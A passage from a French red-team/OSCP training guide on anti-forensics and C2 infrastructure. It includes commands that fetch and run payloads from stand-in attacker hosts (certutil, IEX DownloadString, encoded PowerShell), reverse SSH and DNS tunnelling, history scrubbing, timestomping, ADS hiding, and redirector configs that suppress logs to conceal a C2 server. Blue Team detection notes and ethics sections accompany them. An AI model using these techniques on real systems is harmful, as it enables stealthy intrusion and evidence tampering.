1. **Avantages**
   - Réduit considérablement les artefacts sur disque
   - Peut contourner les solutions de sécurité basées sur les fichiers (antivirus, FIM)
   - Rend l'analyse forensique post-mortem plus difficile

2. **Inconvénients**
   - Les artefacts restent présents en mémoire (RAM)
   - Peut être détecté par des solutions EDR avancées qui surveillent les API et les comportements
   - Nécessite souvent des techniques plus complexes
   - Les traces peuvent persister dans les logs d'exécution de processus ou les logs réseau

### Techniques de nettoyage raisonné

#### Suppression sécurisée de fichiers

1. **Outils de suppression sécurisée**
   - `sdelete` (Windows Sysinternals)
   - `shred`, `wipe` (Linux)
   
   ```bash
   # Windows
   sdelete.exe -p 3 -z C:\path\to\sensitive\file.txt
   
   # Linux
   shred -u -z -n 3 /path/to/sensitive/file.txt
   wipe -r -f /path/to/directory/
   ```

2. **Limitations et considérations**
   - Ne fonctionne pas de manière fiable sur les SSD (wear leveling)
   - Peut laisser des traces dans les journaux du système de fichiers (MFT, $LogFile)
   - Peut être détecté par la surveillance de l'activité disque

3. **Approche éthique**
   - Utiliser uniquement pour supprimer les outils et fichiers temporaires de l'attaquant
   - Ne jamais utiliser pour supprimer des logs ou des fichiers appartenant au système ou à l'utilisateur
   - Documenter les fichiers supprimés

#### Nettoyage de l'historique et des traces d'exécution

1. **Historique des commandes**
   - PowerShell: `Clear-History`, modification du fichier d'historique
   - Bash: `history -c`, `unset HISTFILE`, modification de `.bash_history`
   
   ```powershell
   # PowerShell
   Clear-History
   Remove-Item (Get-PSReadlineOption).HistorySavePath
   
   # Bash
   history -c
   unset HISTFILE
   # Ou éditer manuellement ~/.bash_history pour supprimer les commandes suspectes
   ```

2. **Fichiers temporaires et cache**
   - Suppression des fichiers dans `%TEMP%`, `/tmp`
   - Nettoyage du cache du navigateur (si utilisé)
   
   ```powershell
   # Windows
   Remove-Item $env:TEMP\* -Recurse -Force
   
   # Linux
   rm -rf /tmp/*
   ```

3. **Journaux d'événements (Attention : Zone Grise)**
   - **Effacement complet (Illégal/Non éthique)**: `Clear-EventLog`, suppression des fichiers de log
   - **Modification sélective (Très risqué, souvent non éthique)**: Techniques complexes pour supprimer des entrées spécifiques (ex: utilisation d'outils comme EventCleaner)
   - **Approche éthique recommandée**: Ne pas toucher aux journaux d'événements système. La simulation d'un attaquant sophistiqué peut inclure des techniques pour minimiser la journalisation (ex: exécution en mémoire), mais pas la suppression active des logs.

#### Modification des timestamps

1. **Outils de modification des timestamps**
   - `touch` (Linux)
   - PowerShell (Windows)
   - Outils tiers (ex: Timestomp)
   
   ```bash
   # Linux
   touch -a -m -t 202201010000 /path/to/file
   touch -r /reference/file /path/to/file
   
   # PowerShell
   $file = Get-Item "C:\path\to\file.txt"
   $timestamp = Get-Date "01/01/2022 00:00:00"
   $file.CreationTime = $timestamp
   $file.LastAccessTime = $timestamp
   $file.LastWriteTime = $timestamp
   ```

2. **Technique de Timestomping**
   - Copier les timestamps d'un fichier système légitime sur un fichier malveillant
   - Objectif : Rendre le fichier moins suspect lors d'une analyse chronologique

3. **Limitations et détection**
   - Les systèmes de fichiers modernes (NTFS, ext4) stockent plusieurs timestamps (MACE : Modified, Accessed, Created, Entry Modified)
   - La modification des timestamps peut être détectée par des outils forensiques
   - Peut être considéré comme une altération de preuves si mal utilisé

### Techniques d'obfuscation et de masquage

#### Obfuscation de code et de scripts

1. **PowerShell**
   - Encodage Base64 (`-EncodedCommand`)
   - Concaténation de chaînes, variables aléatoires
   - Utilisation d'alias et de backticks
   - Outils d'obfuscation (Invoke-Obfuscation)
   
   ```powershell
   # Encodage Base64
   $Command = "Write-Host \"Hello, World!\""
   $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
   $EncodedCommand = [Convert]::ToBase64String($Bytes)
   powershell.exe -EncodedCommand $EncodedCommand
   
   # Concaténation et variables
   $a = "Write-"; $b = "Host"; $c = " \"Hello\""; $d = "\"World!\""
   Invoke-Expression ($a + $b + $c + "," + $d)
   ```

2. **Bash/Shell**
   - Encodage Base64
   - Variables, fonctions, alias
   
   ```bash
   # Encodage Base64
   echo "echo Hello, World!" | base64
   # Output: ZWNobyBIZWxsbywgV29ybGQhCg==
   echo "ZWNobyBIZWxsbywgV29ybGQhCg==" | base64 -d | bash
   
   # Variables
   cmd="echo"; msg="Hello"; bash -c "$cmd $msg"
   ```

3. **Autres langages**
   - Techniques similaires d'encodage, de réorganisation du code, de renommage de variables
   - Utilisation de packers ou de crypteurs (avec précaution, souvent détectés par les AV)

#### Masquage des processus et des connexions

1. **Renommage de processus**
   - Utilisation de noms de processus légitimes (svchost.exe, explorer.exe)
   - Techniques pour modifier le nom du processus en mémoire

2. **Utilisation de processus légitimes**
   - Injection de code dans des processus existants (Process Injection)
   - Utilisation de LOLBAS (Living Off The Land Binaries and Scripts)
   
   ```powershell
   # Exemple d'utilisation de LOLBAS (certutil)
   certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
   C:\Windows\Temp\payload.exe
   ```

3. **Tunneling et chiffrement**
   - Utilisation de SSH, HTTPS, DNS pour masquer le trafic
   - Chiffrement des communications C2
   
   ```bash
   # Tunneling SSH
   ssh -L 8080:localhost:80 user@jumphost
   ssh -R 9090:localhost:22 user@attacker.com
   
   # Tunneling DNS (exemple avec dnscat2)
   # Sur le serveur attaquant
   sudo ruby dnscat2.rb --dns "domain=skullseclabs.org,host=192.168.1.100" --no-cache
   # Sur la cible
   ./dnscat2 --dns server=192.168.1.100,port=53 --secret=SECRET
   ```

#### Utilisation de systèmes de fichiers alternatifs

1. **Flux de données alternatifs (ADS - Windows)**
   - Stockage de fichiers ou de données dans des flux cachés attachés à des fichiers légitimes
   
   ```powershell
   # Écrire dans un ADS
   Set-Content -Path C:\Windows\System32\notepad.exe -Stream HiddenData -Value "Malicious content"
   Get-Content -Path C:\Windows\System32\notepad.exe -Stream HiddenData
   
   # Exécuter un binaire depuis un ADS
   type C:\path\to\payload.exe > C:\Windows\System32\calc.exe:payload.exe
   wmic process call create "C:\Windows\System32\calc.exe:payload.exe"
   ```

2. **Systèmes de fichiers en mémoire (RAM Disks)**
   - Création d'un système de fichiers temporaire en RAM
   - Les données disparaissent au redémarrage
   
   ```bash
   # Linux
   mkdir /mnt/ramdisk
   mount -t tmpfs -o size=100M tmpfs /mnt/ramdisk
   cp /path/to/tool /mnt/ramdisk/
   cd /mnt/ramdisk
   ./tool
   # Nettoyage
   cd /
   umount /mnt/ramdisk
   rmdir /mnt/ramdisk
   ```

3. **Stockage dans des emplacements inhabituels**
   - Utilisation de répertoires système peu surveillés
   - Stockage dans le registre (Windows)
   
   ```powershell
   # Stockage dans le registre
   $Data = [System.Text.Encoding]::Unicode.GetBytes("Malicious data")
   New-ItemProperty -Path "HKCU:\Software\MyApp" -Name "HiddenData" -PropertyType Binary -Value $Data
   ```

### Considérations éthiques et légales

#### Respect des règles d'engagement

1. **Définition claire du périmètre**
   - Spécifier explicitement les techniques d'anti-forensics autorisées
   - Définir les limites (ex: interdiction de supprimer les logs système)

2. **Communication avec le client**
   - Informer le client des techniques utilisées et de leurs implications
   - Obtenir une autorisation écrite

3. **Documentation rigoureuse**
   - Enregistrer toutes les actions d'anti-forensics effectuées
   - Justifier l'utilisation de chaque technique

#### Minimisation des impacts négatifs

1. **Éviter les dommages collatéraux**
   - S'assurer que les techniques n'affectent pas la stabilité ou la disponibilité du système
   - Tester les techniques dans un environnement contrôlé

2. **Réversibilité des actions**
   - Privilégier les techniques réversibles
   - Documenter les étapes pour annuler les modifications si nécessaire

3. **Focus sur la simulation**
   - L'objectif est de simuler un attaquant, pas de causer des dommages réels
   - Adapter le niveau d'anti-forensics au scénario de menace simulé

#### Responsabilité du pentester

1. **Compréhension des implications légales**
   - Connaître les lois relatives à l'accès non autorisé et à l'altération de données
   - Agir toujours dans un cadre légal et éthique

2. **Prise de décision éclairée**
   - Évaluer les risques et les bénéfices de chaque technique
   - Choisir les méthodes les moins intrusives possibles pour atteindre les objectifs

3. **Transparence**
   - Être transparent avec le client sur les actions entreprises
   - Fournir des recommandations claires pour améliorer la détection et la réponse

### Vue Blue Team / logs générés / alertes SIEM

#### Détection de l'exécution en mémoire

1. **Surveillance des API**
   - Surveillance des appels API suspects (VirtualAllocEx, CreateRemoteThread, etc.)
   - Analyse comportementale des processus

2. **Analyse de la mémoire (RAM Forensics)**
   - Identification de processus injectés ou évidés
   - Extraction de code malveillant et d'artefacts de la mémoire

3. **Logs PowerShell**
   - Surveillance des scripts suspects (Script Block Logging, Module Logging)
   - Détection de l'utilisation de `IEX`, `Invoke-Expression`, commandes encodées
   
   **Exemple de log (Event ID 4104) :**
   ```
   Log Name:      Microsoft-Windows-PowerShell/Operational
   Source:        Microsoft-Windows-PowerShell
   Event ID:      4104
   Task Category: Execute a Remote Command
   Level:         Warning
   Keywords:      None
   User:          DOMAIN\user
   Computer:      CLIENT-PC
   Description:
   Creating Scriptblock text (1 of 1):
   IEX ((new-object net.webclient).downloadstring(\'http://attacker.com/script.ps1\'))
   
   ScriptBlock ID: 12345678-abcd-1234-abcd-123456789abc
   Path: 
   ```

#### Détection du nettoyage de traces

1. **Surveillance de l'intégrité des fichiers (FIM)**
   - Détection de la suppression ou de la modification de fichiers critiques
   - Alertes sur la suppression massive de fichiers

2. **Analyse des journaux système**
   - Détection de l'utilisation d'outils de suppression sécurisée (`sdelete`, `shred`)
   - Surveillance des commandes de nettoyage d'historique (`history -c`, `Clear-History`)
   - **Détection de l'effacement des logs (critique)**: Surveillance de l'événement 1102 (Windows) ou des modifications des fichiers de log (Linux)

3. **Analyse des timestamps**
   - Identification des incohérences dans les timestamps (MACE)
   - Détection de l'utilisation d'outils de timestomping

#### Détection de l'obfuscation et du masquage

1. **Analyse statique et dynamique**
   - Détection de code obfusqué par les antivirus et EDR
   - Analyse comportementale pour identifier les processus masqués

2. **Surveillance réseau**
   - Détection de tunneling ou de communications chiffrées suspectes
   - Analyse du trafic DNS pour détecter l'exfiltration ou le C2

3. **Analyse des artefacts système**
   - Détection de l'utilisation de flux de données alternatifs (ADS)
   - Surveillance des modifications du registre ou des emplacements inhabituels

#### Alertes SIEM typiques

**Alerte d'exécution en mémoire :**
```
[ALERT] Suspicious In-Memory Execution Detected
Host: CLIENT-PC
User: DOMAIN\user
Time: 2023-05-15 14:23:45
Details: PowerShell execution via IEX DownloadString detected
Command: IEX ((new-object net.webclient).downloadstring(\'http://attacker.com/script.ps1\'))
Severity: High
```

**Alerte de nettoyage d'historique :**
```
[ALERT] Command History Clearing Attempt Detected
Host: LINUX-SERVER
User: user
Time: 2023-05-15 14:24:12
Details: Execution of 'history -c' command detected
Severity: Medium
```

**Alerte d'utilisation d'outil de suppression sécurisée :**
```
[ALERT] Secure Deletion Tool Usage Detected
Host: CLIENT-PC
User: DOMAIN\user
Time: 2023-05-15 14:25:10
Details: Execution of sdelete.exe detected
Command: sdelete.exe -p 3 -z C:\Users\user\AppData\Local\Temp\tool.exe
Severity: Medium
```

**Alerte de Timestomping :**
```
[ALERT] Potential Timestomping Activity Detected
Host: CLIENT-PC
User: DOMAIN\user
Time: 2023-05-15 14:26:05
Details: File timestamps modified to match older system file
File: C:\Users\user\AppData\Local\Temp\payload.exe
Reference File: C:\Windows\System32\kernel32.dll
Severity: High
```

**Alerte d'utilisation d'ADS :**
```
[ALERT] Alternate Data Stream Usage Detected
Host: CLIENT-PC
User: DOMAIN\user
Time: 2023-05-15 14:27:30
Details: Data written to Alternate Data Stream
File: C:\Windows\System32\notepad.exe:HiddenData
Severity: Medium
```

### Points clés

- L'anti-forensics éthique simule les techniques d'évasion des attaquants dans le respect des règles d'engagement et de la loi.
- L'exécution en mémoire (scripts, binaires) réduit les artefacts disque mais laisse des traces en RAM et dans les logs d'exécution.
- Le nettoyage raisonné se concentre sur la suppression des outils de l'attaquant et de l'historique, en évitant l'altération des logs système.
- L'obfuscation et le masquage visent à rendre le code, les processus et les communications plus difficiles à détecter.
- Les considérations éthiques et légales sont primordiales : obtenir l'autorisation, documenter, minimiser l'impact et agir de manière responsable.
- Les équipes bleues peuvent détecter ces techniques via la surveillance des API, l'analyse mémoire, la FIM, l'analyse des logs et la surveillance réseau.

### Mini-quiz (3 QCM)

1. **Quelle technique permet d'exécuter un script PowerShell téléchargé depuis Internet sans l'écrire sur le disque ?**
   - A) `Invoke-Command -ScriptBlock`
   - B) `Start-Process powershell.exe -ArgumentList`
   - C) `IEX (New-Object Net.WebClient).DownloadString()`
   - D) `Register-PSSessionConfiguration`

   *Réponse : C*

2. **Quelle est la principale limitation de la suppression sécurisée de fichiers avec des outils comme `shred` ou `sdelete` sur les disques SSD ?**
   - A) Ils sont trop lents pour être efficaces.
   - B) Ils ne fonctionnent que sur les systèmes Linux.
   - C) Le wear leveling des SSD rend l'écrasement des données non fiable.
   - D) Ils sont facilement détectés par les antivirus.

   *Réponse : C*

3. **Dans un contexte éthique, quelle action concernant les journaux d'événements système est généralement considérée comme inacceptable ?**
   - A) Analyser les journaux pour comprendre la détection.
   - B) Utiliser des techniques pour minimiser la génération de logs.
   - C) Effacer complètement les journaux d'événements.
   - D) Corréler les journaux avec d'autres sources de données.

   *Réponse : C*

### Lab/Exercice guidé : Exécution en mémoire et nettoyage discret

#### Objectif
Exécuter un payload en mémoire, effectuer une action simple, puis nettoyer les traces de manière éthique et discrète.

#### Prérequis
- Machine Windows avec PowerShell
- Accès Internet (pour télécharger un payload simple)
- Un payload simple (ex: un script PowerShell qui écrit un fichier)

#### Étapes

1. **Préparation du payload**

```powershell
# Sur une machine contrôlée par l'attaquant, créer un script simple
# payload.ps1
"Hello from in-memory execution!" | Out-File -FilePath "$env:TEMP\proof.txt"
Write-Host "Payload executed, proof file created."

# Héberger ce fichier sur un serveur web accessible par la cible
# Exemple: python3 -m http.server 80
```

2. **Exécution en mémoire sur la cible**

```powershell
# Sur la machine cible
# Définir l'URL du payload
$PayloadUrl = "http://ATTACKER_IP/payload.ps1"

# Créer une commande PowerShell pour télécharger et exécuter en mémoire
$Command = "IEX (New-Object Net.WebClient).DownloadString(\"$PayloadUrl\")"

# Encoder la commande en Base64 pour plus de discrétion
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)

# Exécuter la commande encodée
Write-Host "Executing payload in memory..."
powershell.exe -EncodedCommand $EncodedCommand

# Vérifier si le fichier a été créé
if (Test-Path "$env:TEMP\proof.txt") {
    Write-Host "Proof file found: $(Get-Content "$env:TEMP\proof.txt")"
} else {
    Write-Host "Proof file not found."
}
```

3. **Nettoyage raisonné et éthique**

```powershell
# Supprimer le fichier créé par le payload (artefact de l'attaque)
Write-Host "Cleaning up payload artifacts..."
if (Test-Path "$env:TEMP\proof.txt") {
    Remove-Item "$env:TEMP\proof.txt" -Force
    Write-Host "Proof file removed."
}

# Nettoyer l'historique PowerShell
Write-Host "Cleaning PowerShell history..."
Clear-History
$HistoryPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $HistoryPath) {
    # Supprimer uniquement les commandes liées à cet exercice (plus réaliste)
    $History = Get-Content $HistoryPath
    $CleanHistory = $History | Where-Object { -not ($_ -match "payload.ps1" -or $_ -match "EncodedCommand" -or $_ -match "proof.txt") }
    Set-Content $HistoryPath $CleanHistory
    Write-Host "Relevant PowerShell history entries removed."
} else {
    Write-Host "PowerShell history file not found."
}

# Purger les tickets Kerberos (bonne pratique, même si non utilisés ici)
Write-Host "Purging Kerberos tickets..."
klist purge

Write-Host "Ethical cleanup completed."
```

4. **Vérification (Perspective Blue Team)**

```powershell
# Sur la machine cible, vérifier les traces restantes

# Vérifier l'historique PowerShell (devrait être nettoyé des commandes spécifiques)
Get-History

# Vérifier le fichier de log PowerShell (si activé)
# Rechercher l'Event ID 4104 pour l'exécution de ScriptBlock
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object -First 5 -ExpandProperty Message
# L'exécution de la commande encodée sera probablement loguée ici

# Vérifier les fichiers temporaires (proof.txt devrait être supprimé)
Get-ChildItem $env:TEMP

# Vérifier les tickets Kerberos (devraient être purgés)
klist
```

#### Vue Blue Team

1. **Détection de l'exécution en mémoire**
   - Logs PowerShell (Event ID 4104) montrant l'exécution de code via `IEX DownloadString` ou une commande encodée.
   - Surveillance réseau détectant la connexion vers `ATTACKER_IP` pour télécharger le payload.
   - Analyse mémoire pouvant révéler le script PowerShell exécuté.

2. **Détection du nettoyage**
   - Logs PowerShell (Event ID 4103) montrant l'exécution de `Clear-History`.
   - Surveillance de l'intégrité des fichiers (FIM) détectant la suppression de `proof.txt`.
   - Surveillance des commandes système détectant l'exécution de `klist purge`.

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir exécuté un script PowerShell en mémoire sans l'écrire sur disque.
- Avoir effectué une action simple (création de fichier).
- Avoir nettoyé les artefacts directs de l'attaque (fichier créé) et l'historique des commandes de manière sélective.
- Comprendre que même avec un nettoyage éthique, des traces persistent (logs PowerShell, logs réseau).
- Apprécier la différence entre le nettoyage des outils de l'attaquant et l'altération illégale des logs système.
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 21 : OPSEC Niveau 3 - Infrastructure C2 & OPSEC complexe

### Introduction : Pourquoi ce thème est crucial

Bienvenue dans le chapitre le plus avancé de ce guide, dédié à l'Operational Security (OPSEC) de niveau 3 et à la mise en place d'une infrastructure de Command and Control (C2) complexe et résiliente. Alors que les niveaux précédents se concentraient sur l'hygiène de base et la furtivité active au niveau de l'hôte et des actions individuelles, ce niveau aborde la conception et la gestion d'une infrastructure d'attaque sophistiquée, capable de résister à la détection et au démantèlement par des équipes de sécurité matures (Blue Teams).

La maîtrise de l'OPSEC Niveau 3 est indispensable pour les professionnels de la sécurité offensive (Red Teamers) et constitue un différenciateur clé pour les candidats OSCP visant l'excellence. Dans les engagements réels et les scénarios d'examen complexes, une infrastructure C2 mal conçue ou facilement identifiable peut entraîner un échec rapide. Ce chapitre vous guidera à travers les concepts et les techniques nécessaires pour construire et opérer une infrastructure C2 qui maximise la furtivité, la résilience et l'efficacité opérationnelle, tout en restant dans un cadre éthique.

Nous explorerons l'architecture multi-niveaux, les techniques avancées de profilage et de modelage du trafic, le chiffrement robuste, les stratégies de rotation et de résilience, ainsi que les méthodes pour déjouer les mécanismes de détection modernes. Ce chapitre est dense et technique, mais essentiel pour atteindre le sommet de l'art du pentesting et du Red Teaming.

**(Note : Ce chapitre sera divisé en plusieurs parties en raison de sa longueur et de sa complexité.)**

---

## Partie 1 : Architecture C2 multi-niveaux et Redirecteurs

### Principes de l'architecture C2 moderne

#### Objectifs d'une infrastructure C2 robuste

1.  **Furtivité :** Échapper à la détection par les outils de sécurité (IDS/IPS, Proxy, EDR, SIEM).
2.  **Résilience :** Survivre aux tentatives de blocage ou de démantèlement (takedown) par la Blue Team.
3.  **Flexibilité :** S'adapter à différents environnements cibles et scénarios d'attaque.
4.  **Attribution :** Rendre difficile l'attribution de l'infrastructure à l'équipe attaquante.
5.  **Gestion :** Faciliter la gestion des implants et la collecte des données.

#### Composants clés d'une infrastructure C2

1.  **Serveur C2 (Team Server) :** Le cœur de l'infrastructure, où l'opérateur interagit avec les implants. Héberge le framework C2 (Cobalt Strike, Sliver, Mythic, etc.). Doit être protégé et jamais exposé directement à la cible.
2.  **Implants/Agents/Beacons :** Le code malveillant exécuté sur les machines compromises, qui communique avec l'infrastructure C2.
3.  **Redirecteurs (Redirectors) :** Serveurs intermédiaires (typiquement des VPS) qui relaient le trafic entre les implants et le serveur C2. Ils masquent l'adresse IP réelle du serveur C2 et peuvent filtrer le trafic.
4.  **Domaines et Adresses IP :** Noms de domaine et adresses IP utilisés pour la communication. Le choix et la gestion de ces éléments sont cruciaux pour l'OPSEC.
5.  **CDN (Content Delivery Network) / Edge Services :** Services comme Cloudflare, Fastly, Akamai, utilisés pour masquer davantage l'origine du trafic, améliorer la résilience et parfois contourner les listes blanches.
6.  **Serveurs Leurres (Decoys) :** Serveurs configurés pour répondre aux scans ou aux connexions non sollicitées avec du contenu légitime ou bénin, détournant l'attention de l'infrastructure réelle.
7.  **Nœuds de Staging (Staging Nodes) :** Serveurs utilisés pour héberger les payloads initiaux (stagers) qui téléchargent ensuite l'implant complet. Permet de séparer la livraison du payload de la communication C2 principale.

#### Modèle d'architecture multi-niveaux

Un modèle courant implique plusieurs couches entre l'implant et le serveur C2 :

```
Implant (Cible) <--> Redirecteur(s) <--> [CDN/Edge] <--> Serveur C2 (Team Server)
```

-   **Implant vers Redirecteur :** Communication directe ou via des techniques comme le Domain Fronting.
-   **Redirecteur vers Serveur C2 :** Connexion sécurisée (VPN, SSH tunnel, TLS mutuel) ou via un autre redirecteur/CDN.
-   **Filtrage :** Les redirecteurs filtrent le trafic entrant pour ne laisser passer que les connexions légitimes des implants vers le serveur C2, et bloquent les scans ou les connexions des analystes de sécurité.

### Redirecteurs : Rôle et configuration

#### Pourquoi utiliser des redirecteurs ?

1.  **Masquage de l'IP du Team Server :** L'objectif principal est d'éviter que l'adresse IP du serveur C2 ne soit exposée directement. Si un redirecteur est brûlé (détecté et bloqué), le serveur C2 reste opérationnel.
2.  **Filtrage du trafic :** Permet de bloquer les scans, les connexions non sollicitées et les tentatives d'analyse par la Blue Team ou des chercheurs en sécurité.
3.  **Répartition de la charge :** Plusieurs redirecteurs peuvent pointer vers un même serveur C2.
4.  **Adaptation géographique :** Utiliser des redirecteurs géographiquement proches des cibles peut réduire la latence et paraître moins suspect.
5.  **Catégorisation de domaine :** Utiliser des domaines différents sur les redirecteurs permet de varier les profils de communication.

#### Types de redirecteurs

1.  **Proxy inverse simple (socat, nginx stream) :** Relais TCP/UDP basique. Facile à mettre en place mais offre peu de filtrage applicatif.
2.  **Proxy inverse HTTP/S (Apache mod_proxy, Nginx proxy_pass) :** Permet un filtrage plus fin basé sur les requêtes HTTP (User-Agent, URI, Headers, etc.). Le plus couramment utilisé pour les C2 HTTP/S.
3.  **Redirection DNS (via CNAME) :** Ne masque pas l'IP mais permet une rotation facile. Souvent utilisé en combinaison avec d'autres types.
4.  **Redirection via CDN/Edge :** Utilise l'infrastructure d'un CDN pour relayer le trafic.

#### Configuration de redirecteurs avec Apache et Nginx

##### Prérequis

-   Un VPS (Virtual Private Server) avec une adresse IP publique (ex: chez DigitalOcean, Linode, Vultr).
-   Un nom de domaine pointant vers l'IP du VPS.
-   Certificat SSL/TLS (Let's Encrypt est couramment utilisé).
-   Serveur C2 (Team Server) avec son adresse IP et port.

##### Installation (Exemple sur Ubuntu/Debian)

```bash
# Mettre à jour le système
sudo apt update && sudo apt upgrade -y

# Installer Apache ou Nginx
sudo apt install apache2 -y  # Pour Apache
sudo apt install nginx -y   # Pour Nginx

# Installer Certbot pour Let's Encrypt
sudo apt install certbot python3-certbot-apache -y # Pour Apache
sudo apt install certbot python3-certbot-nginx -y  # Pour Nginx

# Obtenir un certificat SSL (remplacer yourdomain.com)
# Apache
sudo certbot --apache -d yourdomain.com
# Nginx
sudo certbot --nginx -d yourdomain.com
```

##### Configuration Apache (`mod_proxy` et `mod_rewrite`)

1.  **Activer les modules nécessaires :**
    ```bash
    sudo a2enmod proxy proxy_http rewrite ssl headers
    sudo systemctl restart apache2
    ```

2.  **Configurer le VirtualHost (ex: `/etc/apache2/sites-available/yourdomain.com-le-ssl.conf`) :**
    ```apache
    <IfModule mod_ssl.c>
    <VirtualHost *:443>
        ServerName yourdomain.com
        # ... (Configuration SSL générée par Certbot) ...
        SSLEngine on
        SSLCertificateFile /etc/letsencrypt/live/yourdomain.com/fullchain.pem
        SSLCertificateKeyFile /etc/letsencrypt/live/yourdomain.com/privkey.pem
        Include /etc/letsencrypt/options-ssl-apache.conf

        # --- Configuration OPSEC du Redirecteur --- 
        
        # 1. Politique de sécurité de base
        SSLProtocol             all -SSLv3 -TLSv1 -TLSv1.1
        SSLCipherSuite          ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        SSLHonorCipherOrder     off
        SSLSessionTickets       off
        Header always set Strict-Transport-Security "max-age=63072000" 
        Header always set X-Content-Type-Options "nosniff"
        Header always set Referrer-Policy "strict-origin-when-cross-origin"
        # Header always set Content-Security-Policy "default-src 'self'; ..." # Optionnel, pour le contenu leurre

        # 2. Logging minimal (compromis OPSEC vs Debug)
        LogLevel warn
        ErrorLog /dev/null # Rediriger les erreurs vers null pour OPSEC
        # CustomLog /dev/null combined # Rediriger les logs d'accès vers null
        # Alternative: Loguer uniquement les requêtes bloquées
        CustomLog ${APACHE_LOG_DIR}/blocked.log combined env=BLOCK

        # 3. Activation de mod_rewrite
        RewriteEngine On

        # 4. Filtrage des requêtes (Exemples à adapter à votre profil C2)
        # Bloquer les User-Agents suspects (scanners, curl, wget, python, etc.)
        RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|nikto|nmap|sqlmap|Go-http-client) [NC]
        RewriteRule ^ - [F,L] # F = Forbidden (403), L = Last rule

        # Bloquer les requêtes sans User-Agent
        RewriteCond %{HTTP_USER_AGENT} ^$
        RewriteRule ^ - [F,L]

        # Autoriser uniquement certains chemins URI utilisés par le C2
        RewriteCond %{REQUEST_URI} !^/(api/v1/beacon|download/payload.exe|submit/data)$ [NC]
        # Si l'URI ne correspond PAS à ceux autorisés...
        # ... rediriger vers un site leurre ou retourner 404/403
        # RewriteRule ^/(.*)$ http://decoy-site.com/$1 [P,L] # P = Proxy vers le leurre
        RewriteRule ^ - [F,L] # Ou simplement bloquer

        # Autoriser uniquement certaines méthodes HTTP (ex: GET, POST)
        RewriteCond %{REQUEST_METHOD} !^(GET|POST)$
        RewriteRule ^ - [F,L]

        # (Optionnel) Filtrage basé sur l'IP source (listes blanches/noires)
        # Require ip 1.2.3.4 # Autoriser une IP spécifique
        # Require not ip 5.6.7.8 # Bloquer une IP spécifique

        # 5. Proxy vers le Team Server C2 (UNIQUEMENT si les conditions précédentes sont passées)
        # Assurez-vous que cette règle est APRES les règles de filtrage
        # Remplacer C2_SERVER_IP et C2_SERVER_PORT
        ProxyPreserveHost On
        ProxyPass / http://C2_SERVER_IP:C2_SERVER_PORT/
        ProxyPassReverse / http://C2_SERVER_IP:C2_SERVER_PORT/
        RequestHeader set X-Forwarded-For "%{REMOTE_ADDR}s"

        # (Optionnel) Configuration d'un site leurre pour les requêtes bloquées
        # Si vous utilisez la redirection [P,L] vers un leurre ci-dessus
        # <Location /decoy>
        #    ProxyPass http://localhost:8080/ # Serveur leurre local
        #    ProxyPassReverse http://localhost:8080/
        # </Location>

    </VirtualHost>
    </IfModule>
    ```

3.  **Tester la configuration et redémarrer Apache :**
    ```bash
    sudo apache2ctl configtest
    sudo systemctl restart apache2
    ```

##### Configuration Nginx (`proxy_pass`)

1.  **Configurer le bloc `server` (ex: `/etc/nginx/sites-available/yourdomain.com`) :**
    *(Note : Certbot modifie généralement ce fichier pour ajouter la configuration SSL)*
    ```nginx
    server {
        listen 80;
        server_name yourdomain.com;
        # Redirection HTTP vers HTTPS (ajouté par Certbot)
        return 301 https://$host$request_uri;
    }

    server {
        listen 443 ssl http2;
        server_name yourdomain.com;

        # --- Configuration SSL (générée par Certbot) --- 
        ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
        include /etc/letsencrypt/options-ssl-nginx.conf;
        ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;

        # --- Configuration OPSEC du Redirecteur --- 

        # 1. Politique de sécurité de base
        add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        # add_header Content-Security-Policy "default-src 'self'; ..." always; # Optionnel

        # 2. Logging minimal
        access_log off; # Désactiver les logs d'accès
        error_log /dev/null crit; # Loguer uniquement les erreurs critiques vers null

        # 3. Filtrage des requêtes (Exemples à adapter)
        # Utilisation de 'map' pour une meilleure performance et lisibilité
        map $http_user_agent $block_ua {
            default 0;
            ~*(curl|wget|python|nikto|nmap|sqlmap|Go-http-client) 1;
            "" 1; # Bloquer User-Agent vide
        }

        map $request_method $block_method {
            default 1;
            GET 0;
            POST 0;
        }

        # Bloquer si les conditions sont remplies
        if ($block_ua) {
            return 403; # Forbidden
        }
        if ($block_method) {
            return 403;
        }

        # Autoriser uniquement certains chemins URI
        location ~ ^/(api/v1/beacon|download/payload.exe|submit/data)$ {
            # Si l'URI correspond, proxy vers le C2
            
            # (Optionnel) Filtrage IP supplémentaire ici si nécessaire
            # allow 1.2.3.4;
            # deny all;
            
            proxy_pass http://C2_SERVER_IP:C2_SERVER_PORT;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
        }

        # Pour tous les autres chemins URI, retourner 404 ou rediriger vers un leurre
        location / {
            # return 404; # Not Found
            # Ou proxy vers un site leurre
             proxy_pass http://localhost:8080; # Serveur leurre local
             proxy_set_header Host $host;
             # ... autres headers proxy ...
        }
    }
    ```

2.  **Tester la configuration et redémarrer Nginx :**
    ```bash
    sudo nginx -t
    sudo systemctl restart nginx
    ```

#### Filtrage avancé et règles OPSEC

1.  **Filtrage basé sur les Headers HTTP :**
